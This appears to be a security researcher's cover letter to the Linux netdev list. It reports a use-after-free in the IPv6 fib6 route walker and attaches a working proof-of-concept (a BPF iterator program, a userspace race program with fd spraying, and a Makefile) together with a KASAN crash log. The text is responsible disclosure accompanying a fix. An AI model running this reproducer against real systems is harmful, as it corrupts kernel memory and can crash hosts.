Received: from mail-pf1-f174.google.com (mail-pf1-f174.google.com [209.85.210.174])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 194D839CD10
	for <netdev@vger.kernel.org>; Tue,  8 Sep 2026 07:43:06 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.174
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1788853389; cv=none; b=aY9itMJFrKsQHPnqhsfXbfsYyz0GsponkSOZxXJC68AGo/caMaRGTWYDx1VtjndeVxunIuA9d1DLuP1OLh+uQ+T01EnqLsSlqb5Pujk1RdHqvyd8fYrptzq73xqnvLEcKzSBiHQtHe/zs14ia+j5DB0qdqY/TdZUMig7I0cOxts=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1788853389; c=relaxed/simple;
	bh=MfrtyoRng5AElGMK+lb28ltWREnwPrCIfDxkA5+swhk=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=qy9JpVxfPyB8VOuT7LnRhXiaqoF0r6poJ8wLEUSD75+eXK6bD0yZIciKEaZqccdSVbb5eYHtQ5UJFmDuFwi6WTxR82c8bzmEQrBr4p0ftWOkOD0WmYUsvDUN0X2jQ6qBEVQ3FRmtY//a7kYXfOZbApTjuDkXpHG6NzXbVuoy7SM=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=Z8bXfMlT; arc=none smtp.client-ip=209.85.210.174
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="Z8bXfMlT"
Received: by mail-pf1-f174.google.com with SMTP id d2e1a72fcca58-86309e1a213so812246b3a.0
        for <netdev@vger.kernel.org>; Tue, 08 Sep 2026 00:43:06 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1788853386; x=1789458186; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=w4XcF1eFNV64NWA8E1+wrl7IuCm5sqmoW0RkkcAVpaw=;
        b=Z8bXfMlTzuBeBAgFwbXSoLqybchmjUCah2B3EL3v/xituDbr+v1ZtpH+DS4aN/Pn4f
         aBBsb0rwVmR40xonI+LwKFDq3DhdoAuYU/jbyyGpDh3uYcMIUhDIDUMMZ+a4dxTLqRLJ
         UmqBfx1LPskPjNLQyyJfa8chuvTAwCL0cR4Mj5IOG6ZTLrRKIJji/80cACIxKqIGCaXn
         7c4GTUU3xFfeylG7n9aH2Sh+8LcipQrK1q3xzan+i8koeoI6BkZUVKBf/iKtKhZmW2hj
         b2qG3DDLPkoEeDXjMKB3NtF0Uu0shvgZL+5PXJUrAPNnGWWGhAssTRaKtYiXyYCZnfLz
         f78g==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1788853386; x=1789458186;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=w4XcF1eFNV64NWA8E1+wrl7IuCm5sqmoW0RkkcAVpaw=;
        b=A1l0vTe+FQkH4rDQYv6B08M/STa/Q/nQIxd31YlwJpviLxh8W7VBYJ7KiKTRRbGGuJ
         jWOhMQuL6iSawqzJv1DkM5eRc/hd8BAOKhEmF1b5ReF054aYrcgmD5qHLRXzVQbxNYy/
         afLrv+QPZnNU6QnyefkhdEVpMWR5DTDg4FloT81/1m+nyYaTth57Q8vaPW9V5R8kK7l2
         siXurrNAoHyxoQarr193KJqVwKULD22Sgj4fcLkT+XPhgbMEBm2eGe4xyVhxWu3yIEud
         MO2Zrz1HYHdD3XJrSAy8RkLweZxJyKSG+UyXbsB6s2AWREy3Z6UHi7ufLpp9SyCO/Nhz
         XL9w==
X-Forwarded-Encrypted: i=1; AKwUvBwoI99b2Vk1IwsEdXFH4KcI+xUoMF2N94pOH5mLTFvCRRVBTDJ7uqMs1VWf7emFikgyS5GaA9A=@vger.kernel.org
X-Gm-Message-State: AFuF++k6j3UbLjThw8IssWTSDMCe/Mcn4BKZuK7hmCo10vQbY4ErDztg
	uGymI+vBTBUMx5dsJwffmgoiMJbGMOzAyaxo09A1izrBrL3qLvFB9mDILPqN2OWQiwNFw6pWvwz
	NPd6nUIb5
X-Gm-Gg: AYBFou3pdiTdLjfWzPqIKDDwo9x+B4foJmzAJs9cuaqw1f8ncar1RRzxauBawlxovzh
	Mernbj7W0wIU75c0Kl6dR/G8y+J9/D3Ui2QcKYQnoObLABDEL+xfj4LxletQvwup7/GrWzFLZX4
	kn9vOWtRf5BC665pm5voeLj16NUAFQE8+82A13OAy+OUVqT6TYwyfn6VBi4wA/vP+CMseYP3RU4
	+DPAKQdZpKFQ7CF0KK8vriIu2bFEF9qAPnyV5yP2GGfkpOcBR5nBNURC1dy6a1u792nXGRksGl5
	IP6prajm3WBClYWLl4QM95miwRxcl/sKIpxhH7x33uHIQLqUEGNTgljxkR1RdBFCtKDcyaMU54M
	QTIxqupeqrXbSu5O68Uf/+rEJhwpBG28+HGfewmex0U06pqoEC4KteF7bM9OMxxJCyqvjBzr9aJ
	y5xr/H2dSSxSRY1WLMHv0lEvqQ9oUoHOp0bKrgB2Tb6Y0VHGSJhQRu9xBsjR69mYtIsXsBmF8OX
	Z7TcCYfHUGti+I0rTI=
X-Received: by 2002:a05:6a00:929e:b0:857:7317:cff6 with SMTP id d2e1a72fcca58-8616aa630a5mr38098632b3a.23.1788853385001;
        Tue, 08 Sep 2026 00:43:05 -0700 (PDT)
Received: from b6ad5085b32f.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-8633cc0f7e2sm3499943b3a.37.2026.09.08.00.43.01
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Tue, 08 Sep 2026 00:43:04 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: David Ahern <dsahern@kernel.org>,
	Ido Schimmel <idosch@nvidia.com>,
	"David S . Miller" <davem@davemloft.net>,
	Eric Dumazet <edumazet@google.com>,
	Jakub Kicinski <kuba@kernel.org>,
	Paolo Abeni <pabeni@redhat.com>,
	netdev@vger.kernel.org
Cc: Zihan Xi <zihanx@nebusec.ai>,
	Simon Horman <horms@kernel.org>,
	Hannes Frederic Sowa <hannes@stressinduktion.org>,
	linux-kernel@vger.kernel.org
Subject: [PATCH net 0/1] ipv6: fix fib6 walker UAF on seq stop
Date: Tue,  8 Sep 2026 07:42:55 +0000
Message-ID: <cover.1788837093.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated a issue in net/ipv6/ip6_fib.c. We reproduced
it as root using a BPF ipv6_route iterator racing RTM_DELROUTE.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

ipv6_route_iter_active() treats a fib6 walker in FWS_U at the table
root as already unlinked from net->ipv6.fib6_walkers. That heuristic
is wrong when the last route at a table root is deleted:
fib6_del_route() moves a still-linked walker into FWS_U without
unlinking it.

ipv6_route_native_seq_stop() therefore skips fib6_walker_unlink().
The seq private object can then be reset or freed while it remains on
the walker list. A later route deletion or tree repair walks the
dangling list and reads or writes the freed walker.

The same stop helper is used by /proc/net/ipv6_route and by the BPF
ipv6_route iterator. The BPF show program can keep seq_show() in the
FWS_C / leaf window long enough for the delete to land, which makes
the race practical. /proc/net/ipv6_route has the same membership bug
with a narrower window.

The root-cause fact is this false "already unlinked" inference in the
seq iterator. It was introduced by 8d2ca1d7b5c3 ("ipv6: avoid high
order memory allocations for /proc/net/ipv6_route"). fib6_del_route()
already set FWS_U without unlinking before that commit. The later BPF
iterator only widened the trigger window, so Fixes: still points at
8d2ca1d7b5c3.

The fix uses the list head as membership state and reinitializes it
in fib6_walker_unlink(). seq stop can then unlink a terminal walker
that route deletion left linked, while a completed walker that was
already unlinked stays unlinked.

packetdrill is not used because the trigger is an ipv6_route seq
iterator racing RTM_DELROUTE, not a packet sequence. The attached
reproducer is Makefile, poc.bpf.c, and poc.c. poc.c links libbpf,
so it is built with make rather than a single gcc -static line.
The reliable crash we hit used the BPF iterator as root.

Reproducer:

    make
    ./poc ./poc.bpf.o

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN Makefile------
CLANG ?= clang
CC ?= gcc
KDIR ?= /path/to/kernel
LIBBPF_INCLUDE ?= $(KDIR)/build/tools/bpf/resolve_btfids/libbpf/include

BPF_CFLAGS := -g -O2 -target bpf -D__TARGET_ARCH_x86 -Wall -Wextra \
	-I/usr/include/x86_64-linux-gnu \
	-I$(LIBBPF_INCLUDE)
USER_CFLAGS := -g -O2 -Wall -Wextra -I/usr/include/x86_64-linux-gnu \
	-I$(LIBBPF_INCLUDE)
USER_LDLIBS := -L/lib/x86_64-linux-gnu -Wl,-rpath,/lib/x86_64-linux-gnu \
	-l:libbpf.so.1 -lelf -lz

all: poc.bpf.o poc

poc.bpf.o: poc.bpf.c
	$(CLANG) $(BPF_CFLAGS) -c $< -o $@

poc: poc.c
	$(CC) $(USER_CFLAGS) $< -o $@ $(USER_LDLIBS)

clean:
	rm -f poc poc.bpf.o
------END Makefile--------

------BEGIN poc.bpf.c------
// SPDX-License-Identifier: GPL-2.0
#include <linux/bpf.h>
#include <linux/in6.h>
#include <linux/types.h>
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_helpers.h>

struct seq_file;

struct bpf_iter_meta {
	struct seq_file *seq;
} __attribute__((preserve_access_index));

struct fib6_table {
	__u32 tb6_id;
} __attribute__((preserve_access_index));

struct rt6key {
	struct in6_addr addr;
	int plen;
} __attribute__((preserve_access_index));

struct fib6_info {
	struct fib6_table *fib6_table;
	struct rt6key fib6_dst;
	__u32 fib6_metric;
} __attribute__((preserve_access_index));

struct bpf_iter__ipv6_route {
	struct bpf_iter_meta *meta;
	struct fib6_info *rt;
} __attribute__((preserve_access_index));

struct ctrl_state {
	__u32 seen;
	__u32 deleted;
	__u32 done;
	__u32 hits;
	__u32 target_table;
	__u32 target_metric;
};

struct {
	__uint(type, BPF_MAP_TYPE_ARRAY);
	__uint(max_entries, 1);
	__type(key, __u32);
	__type(value, struct ctrl_state);
} ctrl_map SEC(".maps");

SEC("iter/ipv6_route")
int trigger(struct bpf_iter__ipv6_route *ctx)
{
	__u32 key = 0;
	struct ctrl_state *st;
	struct fib6_info *rt;
	struct rt6key dst;
	__u64 chunk = 0x4141414141414141ULL;
	int i;

	if (!ctx || !ctx->meta || !ctx->meta->seq)
		return 0;

	rt = ctx->rt;
	if (!rt)
		return 0;

	st = bpf_map_lookup_elem(&ctrl_map, &key);
	if (!st)
		return 0;

	if (BPF_CORE_READ(rt, fib6_table, tb6_id) != st->target_table)
		return 0;
	if (BPF_CORE_READ(rt, fib6_metric) != st->target_metric)
		return 0;
	dst = BPF_CORE_READ(rt, fib6_dst);
	if (dst.plen != 0)
		return 0;

	st->hits++;
	st->seen = 1;

#pragma clang loop unroll(disable)
	for (i = 0; i < 4096; i++)
		bpf_seq_write(ctx->meta->seq, &chunk, sizeof(chunk));

	st->done = 1;
	return 0;
}

char LICENSE[] SEC("license") = "GPL";
------END poc.bpf.c--------

------BEGIN poc.c------
// SPDX-License-Identifier: GPL-2.0
#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <net/if.h>
#include <pthread.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#include <bpf/bpf.h>
#include <bpf/libbpf.h>

#define TARGET_TABLE 1234
#define TARGET_METRIC 4242
#define TRIGGER_TABLE 1235
#define TRIGGER_METRIC 4343
#define SPRAY_FDS 512
#define DEFAULT_ATTEMPTS 10000

struct ctrl_state {
	uint32_t seen;
	uint32_t deleted;
	uint32_t done;
	uint32_t hits;
	uint32_t target_table;
	uint32_t target_metric;
};

struct reader_args {
	int fd;
	ssize_t ret;
	int err;
};

static int libbpf_log(enum libbpf_print_level level, const char *fmt, va_list ap)
{
	if (level == LIBBPF_DEBUG)
		return 0;
	return vfprintf(stderr, fmt, ap);
}

static void die(const char *msg)
{
	perror(msg);
	exit(EXIT_FAILURE);
}

static void addattr_l(struct nlmsghdr *nlh, size_t maxlen, int type,
		      const void *data, size_t alen)
{
	size_t len = RTA_LENGTH(alen);
	struct rtattr *rta;

	if (NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(len) > maxlen) {
		fprintf(stderr, "netlink attribute overflow\n");
		exit(EXIT_FAILURE);
	}

	rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
	rta->rta_type = type;
	rta->rta_len = len;
	if (alen)
		memcpy(RTA_DATA(rta), data, alen);
	nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(len);
}

static int nl_talk(int fd, struct nlmsghdr *nlh)
{
	struct sockaddr_nl sa = {
		.nl_family = AF_NETLINK,
	};
	struct iovec iov = {
		.iov_base = nlh,
		.iov_len = nlh->nlmsg_len,
	};
	struct msghdr msg = {
		.msg_name = &sa,
		.msg_namelen = sizeof(sa),
		.msg_iov = &iov,
		.msg_iovlen = 1,
	};
	char buf[4096];
	struct nlmsghdr *reply;
	ssize_t len;

	if (sendmsg(fd, &msg, 0) < 0)
		return -errno;

	for (;;) {
		len = recv(fd, buf, sizeof(buf), 0);
		if (len < 0) {
			if (errno == EINTR)
				continue;
			return -errno;
		}

		for (reply = (struct nlmsghdr *)buf; NLMSG_OK(reply, (unsigned int)len);
		     reply = NLMSG_NEXT(reply, len)) {
			if (reply->nlmsg_type == NLMSG_ERROR) {
				struct nlmsgerr *err = NLMSG_DATA(reply);

				if (reply->nlmsg_len < NLMSG_LENGTH(sizeof(*err)))
					return -EIO;
				return err->error;
			}
		}
	}
}

static int change_default_route(int fd, int cmd, uint32_t table, uint32_t metric,
				int ifindex)
{
	struct {
		struct nlmsghdr nlh;
		struct rtmsg rtm;
		char buf[256];
	} req = {
		.nlh = {
			.nlmsg_len = NLMSG_LENGTH(sizeof(struct rtmsg)),
			.nlmsg_type = cmd,
			.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK,
		},
		.rtm = {
			.rtm_family = AF_INET6,
			.rtm_table = RT_TABLE_UNSPEC,
			.rtm_protocol = RTPROT_BOOT,
			.rtm_scope = RT_SCOPE_UNIVERSE,
			.rtm_type = RTN_UNICAST,
		},
	};
	int ret;

	if (cmd == RTM_NEWROUTE)
		req.nlh.nlmsg_flags |= NLM_F_CREATE | NLM_F_EXCL;

	addattr_l(&req.nlh, sizeof(req), RTA_TABLE, &table, sizeof(table));
	addattr_l(&req.nlh, sizeof(req), RTA_PRIORITY, &metric, sizeof(metric));
	addattr_l(&req.nlh, sizeof(req), RTA_OIF, &ifindex, sizeof(ifindex));

	ret = nl_talk(fd, &req.nlh);
	return ret;
}

static void cleanup_routes(int fd, int ifindex)
{
	(void)change_default_route(fd, RTM_DELROUTE, TARGET_TABLE, TARGET_METRIC, ifindex);
	(void)change_default_route(fd, RTM_DELROUTE, TRIGGER_TABLE, TRIGGER_METRIC, ifindex);
}

static void *reader_thread(void *arg)
{
	struct reader_args *reader = arg;
	char buf[64];

	errno = 0;
	reader->ret = read(reader->fd, buf, sizeof(buf));
	reader->err = errno;
	close(reader->fd);
	reader->fd = -1;
	return NULL;
}

static int update_state(int map_fd, const struct ctrl_state *state)
{
	uint32_t key = 0;

	return bpf_map_update_elem(map_fd, &key, state, BPF_ANY);
}

static int lookup_state(int map_fd, struct ctrl_state *state)
{
	uint32_t key = 0;

	return bpf_map_lookup_elem(map_fd, &key, state);
}

static int wait_until_seen(int map_fd, struct ctrl_state *state)
{
	int spins;

	for (spins = 0; spins < 1000000; spins++) {
		if (lookup_state(map_fd, state))
			return -1;
		if (state->seen)
			return 0;
	}
	return -1;
}

int main(int argc, char **argv)
{
	const char *obj_path = "./poc.bpf.o";
	struct bpf_object *obj = NULL;
	struct bpf_program *prog;
	struct bpf_link *link = NULL;
	struct bpf_map *map;
	struct rlimit rlim = {
		.rlim_cur = RLIM_INFINITY,
		.rlim_max = RLIM_INFINITY,
	};
	int route_fd = -1;
	int map_fd;
	int link_fd;
	int ifindex;
	int attempts = DEFAULT_ATTEMPTS;
	int attempt;
	int err;

	if (argc > 1)
		obj_path = argv[1];
	if (argc > 2)
		attempts = atoi(argv[2]);

	libbpf_set_print(libbpf_log);
	libbpf_set_strict_mode(LIBBPF_STRICT_ALL);

	if (setrlimit(RLIMIT_MEMLOCK, &rlim) && errno != EPERM)
		die("setrlimit");

	obj = bpf_object__open_file(obj_path, NULL);
	if (!obj) {
		fprintf(stderr, "failed to open %s\n", obj_path);
		return EXIT_FAILURE;
	}

	err = bpf_object__load(obj);
	if (err) {
		fprintf(stderr, "failed to load BPF object: %d\n", err);
		goto out;
	}

	prog = bpf_object__find_program_by_name(obj, "trigger");
	if (!prog) {
		fprintf(stderr, "failed to find BPF program\n");
		goto out;
	}

	map = bpf_object__find_map_by_name(obj, "ctrl_map");
	if (!map) {
		fprintf(stderr, "failed to find ctrl_map\n");
		goto out;
	}
	map_fd = bpf_map__fd(map);

	link = bpf_program__attach_iter(prog, NULL);
	if (!link) {
		err = -errno;
		fprintf(stderr, "attach_iter failed: %d\n", err);
		goto out;
	}
	link_fd = bpf_link__fd(link);

	route_fd = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_ROUTE);
	if (route_fd < 0)
		die("socket(NETLINK_ROUTE)");

	ifindex = if_nametoindex("lo");
	if (!ifindex) {
		fprintf(stderr, "failed to resolve ifindex for lo\n");
		goto out;
	}

	printf("loaded %s, link_fd=%d, ifindex(lo)=%d, attempts=%d\n",
	       obj_path, link_fd, ifindex, attempts);
	fflush(stdout);

	for (attempt = 1; attempt <= attempts; attempt++) {
		struct ctrl_state state = {
			.target_table = TARGET_TABLE,
			.target_metric = TARGET_METRIC,
		};
		struct reader_args reader = {
			.fd = -1,
			.ret = -1,
			.err = 0,
		};
		pthread_t tid;
		int spray[SPRAY_FDS];
		int iter_fd;
		int i;
		bool saw_target = false;

		memset(spray, -1, sizeof(spray));
		cleanup_routes(route_fd, ifindex);

		err = change_default_route(route_fd, RTM_NEWROUTE,
					   TRIGGER_TABLE, TRIGGER_METRIC, ifindex);
		if (err) {
			fprintf(stderr, "attempt %d: add trigger route failed: %s\n",
				attempt, strerror(-err));
			break;
		}

		err = change_default_route(route_fd, RTM_NEWROUTE,
					   TARGET_TABLE, TARGET_METRIC, ifindex);
		if (err) {
			fprintf(stderr, "attempt %d: add target route failed: %s\n",
				attempt, strerror(-err));
			(void)change_default_route(route_fd, RTM_DELROUTE,
						   TRIGGER_TABLE, TRIGGER_METRIC, ifindex);
			break;
		}

		if (update_state(map_fd, &state)) {
			perror("bpf_map_update_elem");
			break;
		}

		iter_fd = bpf_iter_create(link_fd);
		if (iter_fd < 0) {
			perror("bpf_iter_create");
			break;
		}

		reader.fd = iter_fd;
		if (pthread_create(&tid, NULL, reader_thread, &reader)) {
			perror("pthread_create");
			close(iter_fd);
			break;
		}

		if (!wait_until_seen(map_fd, &state)) {
			saw_target = true;
			err = change_default_route(route_fd, RTM_DELROUTE,
						   TARGET_TABLE, TARGET_METRIC, ifindex);
			if (err) {
				fprintf(stderr,
					"attempt %d: delete target route failed: %s\n",
					attempt, strerror(-err));
			} else {
				state.deleted = 1;
				if (update_state(map_fd, &state))
					perror("bpf_map_update_elem deleted");
			}
		}

		pthread_join(tid, NULL);

		for (i = 0; i < SPRAY_FDS; i++) {
			spray[i] = bpf_iter_create(link_fd);
			if (spray[i] < 0)
				break;
		}

		err = change_default_route(route_fd, RTM_DELROUTE,
					   TRIGGER_TABLE, TRIGGER_METRIC, ifindex);
		if (err) {
			fprintf(stderr, "attempt %d: delete trigger route failed: %s\n",
				attempt, strerror(-err));
		}

		for (i = 0; i < SPRAY_FDS; i++) {
			if (spray[i] >= 0)
				close(spray[i]);
		}

		if (attempt == 1 || !(attempt % 100)) {
			printf("attempt=%d seen=%u deleted=%u done=%u hits=%u read_ret=%zd read_errno=%d saw_target=%d\n",
			       attempt, state.seen, state.deleted, state.done,
			       state.hits, reader.ret, reader.err, saw_target);
			fflush(stdout);
		}
	}

out:
	cleanup_routes(route_fd, if_nametoindex("lo"));
	if (route_fd >= 0)
		close(route_fd);
	if (link)
		bpf_link__destroy(link);
	if (obj)
		bpf_object__close(obj);
	return 0;
}
------END poc.c--------


----BEGIN crash log----

[    9.380711] BUG: KASAN: slab-use-after-free in fib6_del (net/ipv6/ip6_fib.c:2028 net/ipv6/ip6_fib.c:2096)
[    9.380725] Read of size 4 at addr ffff88800bfe9a20 by task poc/276
[    9.380727]
[    9.380730] CPU: 1 UID: 0 PID: 276 Comm: poc Not tainted 7.3.0-rc1-00304-g4ff75f130d1b #2 PREEMPT(lazy)
[    9.380733] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[    9.380735] Call Trace:
[    9.380736]  <TASK>
[    9.380737]  dump_stack_lvl (lib/dump_stack.c:94 lib/dump_stack.c:120)
[    9.380742]  print_report (mm/kasan/report.c:378 mm/kasan/report.c:482)
[    9.380746]  ? __pfx__raw_spin_lock_irqsave (kernel/locking/spinlock.c:190)
[    9.380749]  ? __pfx___nla_validate_parse (lib/nlattr.c:285)
[    9.380753]  ? __virt_addr_valid (include/linux/mmzone.h:2131 (discriminator 1) include/linux/mmzone.h:2277 (discriminator 1) arch/x86/mm/physaddr.c:54 (discriminator 1))
[    9.380757]  ? fib6_del (net/ipv6/ip6_fib.c:2028 net/ipv6/ip6_fib.c:2096)
[    9.380759]  kasan_report (mm/kasan/report.c:595)
[    9.380776]  ? fib6_del (net/ipv6/ip6_fib.c:2028 net/ipv6/ip6_fib.c:2096)
[    9.380779]  fib6_del (net/ipv6/ip6_fib.c:2028 net/ipv6/ip6_fib.c:2096)
[    9.380782]  ? __pfx_fib6_del (net/ipv6/ip6_fib.c:1800)
[    9.380784]  ? _raw_spin_lock_bh (include/linux/instrumented.h:55 include/linux/atomic/atomic-instrumented.h:1301 include/asm-generic/qspinlock.h:112 include/linux/spinlock.h:188 include/linux/spinlock_api_smp.h:183 kernel/locking/spinlock.c:205)
[    9.380787]  ? __pfx__raw_spin_lock_bh (kernel/locking/spinlock.c:174)
[    9.380790]  ? fib6_locate (net/ipv6/ip6_fib.c:1797 (discriminator 1))
[    9.380793]  ip6_route_del (net/ipv6/route.c:4083 net/ipv6/route.c:4232)
[    9.380796]  ? __pfx_ip6_route_del (net/ipv6/route.c:6549)
[    9.380799]  ? unwind_get_return_address (arch/x86/kernel/unwind_orc.c:385)
[    9.380802]  ? arch_stack_walk (arch/x86/kernel/stacktrace.c:26)
[    9.380806]  inet6_rtm_delroute (net/ipv6/route.c:5669)
[    9.380809]  ? __pfx_inet6_rtm_delroute (net/ipv6/route.c:5642)
[    9.380812]  ? stack_trace_save (kernel/stacktrace.c:122 (discriminator 1))
[    9.380817]  ? cap_capable (security/commoncap.c:82 security/commoncap.c:128)
[    9.380819]  ? ____sys_sendmsg (net/socket.c:800 (discriminator 1) net/socket.c:815 (discriminator 1) net/socket.c:2713 (discriminator 1))
[    9.380823]  ? security_capable (security/security.c:660 (discriminator 8))
[    9.380827]  ? __pfx_inet6_rtm_delroute (net/ipv6/route.c:5642)
[    9.380829]  rtnetlink_rcv_msg (net/core/rtnetlink.c:7137)
[    9.380833]  ? __pfx_rtnetlink_rcv_msg (include/net/netlink.h:1734 (discriminator 1))
[    9.380836]  netlink_rcv_skb (net/netlink/af_netlink.c:2556)
[    9.380839]  ? __pfx_rtnetlink_rcv_msg (include/net/netlink.h:1734 (discriminator 1))
[    9.380842]  ? __pfx_netlink_rcv_skb (include/linux/skbuff.h:2772 (discriminator 1))
[    9.380846]  netlink_unicast (net/netlink/af_netlink.c:1319 net/netlink/af_netlink.c:1345)
[    9.380848]  ? __pfx_netlink_unicast (net/netlink/af_netlink.c:1255)
[    9.380851]  netlink_sendmsg (net/netlink/af_netlink.c:1900)
[    9.380854]  ? __pfx_netlink_sendmsg (net/netlink/af_netlink.c:1361)
[    9.380857]  ____sys_sendmsg (net/socket.c:800 (discriminator 1) net/socket.c:815 (discriminator 1) net/socket.c:2713 (discriminator 1))
[    9.380860]  ? __pfx_____sys_sendmsg (net/socket.c:1151 (discriminator 1))
[    9.380863]  ? __pfx_copy_msghdr_from_user (net/socket.c:2607)
[    9.380865]  ? __sys_bpf (include/linux/instrumented.h:112 include/linux/atomic/atomic-instrumented.h:2961 kernel/bpf/syscall.c:3382 kernel/bpf/syscall.c:6153 kernel/bpf/syscall.c:6458)
[    9.380869]  ? __pfx___sys_bpf (kernel/bpf/syscall.c:4289)
[    9.380872]  ___sys_sendmsg (net/socket.c:2767)
[    9.380875]  ? __pfx____sys_sendmsg (net/socket.c:2654)
[    9.380878]  ? swake_up_one (include/linux/list.h:54 (discriminator 2) include/linux/list.h:334 (discriminator 2) kernel/sched/swait.c:31 (discriminator 2) kernel/sched/swait.c:22 (discriminator 2) kernel/sched/swait.c:53 (discriminator 2))
[    9.380881]  ? rcu_segcblist_nextgp (kernel/rcu/rcu_segcblist.c:317)
[    9.380885]  ? fdget (fs/file.c:1196 (discriminator 1) fs/file.c:1208 (discriminator 1))
[    9.380889]  __sys_sendmsg (net/socket.c:2799)
[    9.380891]  ? __pfx___sys_sendmsg (net/socket.c:2780)
[    9.380894]  ? __x64_sys_bpf (kernel/bpf/syscall.c:6486 (discriminator 2) kernel/bpf/syscall.c:6483 (discriminator 2) kernel/bpf/syscall.c:6483 (discriminator 2))
[    9.380897]  ? __x64_sys_bpf (kernel/bpf/syscall.c:6486 (discriminator 2) kernel/bpf/syscall.c:6483 (discriminator 2) kernel/bpf/syscall.c:6483 (discriminator 2))
[    9.380900]  do_syscall_64 (arch/x86/entry/syscall_64.c:61 arch/x86/entry/syscall_64.c:84)
[    9.380903]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[    9.380906] RIP: 0033:0x52e65b
[    9.380908] Code: 48 89 e5 48 83 ec 20 89 55 ec 48 89 75 f0 89 7d f8 e8 e9 67 03 00 8b 55 ec 48 8b 75 f0 41 89 c0 8b 7d f8 b8 2e 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 2d 44 89 c7 48 89 45 f8 e8 41 68 03 00 48 8b
All code
========
   0:	48 89 e5             	mov    %rsp,%rbp
   3:	48 83 ec 20          	sub    $0x20,%rsp
   7:	89 55 ec             	mov    %edx,-0x14(%rbp)
   a:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
   e:	89 7d f8             	mov    %edi,-0x8(%rbp)
  11:	e8 e9 67 03 00       	call   0x367ff
  16:	8b 55 ec             	mov    -0x14(%rbp),%edx
  19:	48 8b 75 f0          	mov    -0x10(%rbp),%rsi
  1d:	41 89 c0             	mov    %eax,%r8d
  20:	8b 7d f8             	mov    -0x8(%rbp),%edi
  23:	b8 2e 00 00 00       	mov    $0x2e,%eax
  28:	0f 05                	syscall
  2a:*	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax		<-- trapping instruction
  30:	77 2d                	ja     0x5f
  32:	44 89 c7             	mov    %r8d,%edi
  35:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  39:	e8 41 68 03 00       	call   0x3687f
  3e:	48                   	rex.W
  3f:	8b                   	.byte 0x8b

Code starting with the faulting instruction
===========================================
   0:	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax
   6:	77 2d                	ja     0x35
   8:	44 89 c7             	mov    %r8d,%edi
   b:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   f:	e8 41 68 03 00       	call   0x36855
  14:	48                   	rex.W
  15:	8b                   	.byte 0x8b
[    9.380911] RSP: 002b:00007ffcfc7e99e0 EFLAGS: 00000293 ORIG_RAX: 000000000000002e
[    9.380914] RAX: ffffffffffffffda RBX: 0000000000000007 RCX: 000000000052e65b
[    9.380916] RDX: 0000000000000000 RSI: 00007ffcfc7e9a30 RDI: 0000000000000007
[    9.380918] RBP: 00007ffcfc7e9a00 R08: 0000000000000000 R09: 0000000000000006
[    9.380919] R10: 0000000000000006 R11: 0000000000000293 R12: 00007ffcfc7eac90
[    9.380921] R13: 0000000000000004 R14: 00007ffcfc7eb490 R15: 0000000000000001
[    9.380924]  </TASK>
[    9.380925]
[    9.380925] Allocated by task 276:
